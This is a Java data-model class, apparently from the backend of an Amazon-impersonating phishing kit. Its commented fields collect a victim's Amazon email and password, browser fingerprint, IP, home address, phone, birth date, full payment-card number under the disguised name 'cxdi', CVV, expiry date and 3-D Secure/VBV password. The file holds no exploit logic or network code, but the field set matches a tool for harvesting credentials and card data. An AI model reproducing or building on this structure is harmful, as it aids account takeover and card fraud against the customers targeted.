package com.kidd.amazon.model;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class UserInfoForm {
    private String al;

    private String dateTime;
    /**
     * amazon账号
     */
    private String email;

    /**
     * amazom密码
     */
    private String emailPwd;

    /**
     * 指纹
     */
    private String userAgent;

    /**
     * ip
     */
    private String ip;

    /**
     * 国家
     */
    private String countryCode;

    /**
     * 人全名
     */
    private String enterAddressFullName;

    /**
     * 邮编1
     */
    private String enterAddressPostalCodeOne;

    /**
     * 邮编2
     */
    private String enterAddressPostalCodeTwo;

    /**
     * 省县
     */
    private String enterAddressStateOrRegion;

    /**
     * 出生年份
     */
    private String birth_year;

    /**
     * 出生月份
     */
    private String birth_month;

    /**
     * 出生日期
     */
    private String birth_day;


    /**
     * 住址1
     */
    private String enterAddressLine1;

    /**
     * 住址2
     */
    private String enterAddressLine2;

    /**
     * 住址3
     */
    private String enterAddressLine3;

    /**
     * 电话
     */
    private String enterAddressPhoneNumber;

    /**
     * cvv持卡人
     */
    private String nameCard;
    /**
     * cvv卡号
     */
    private String cxdi;

    /**
     * cvv
     */
    private String csc;

    /**
     * cvv月份
     */
    private String month;

    /**
     * cvv年份
     */
    private String year;

    /**
     * 3d验证码
     */
    private String password_vbv;

    private String kiddfiled1;
}
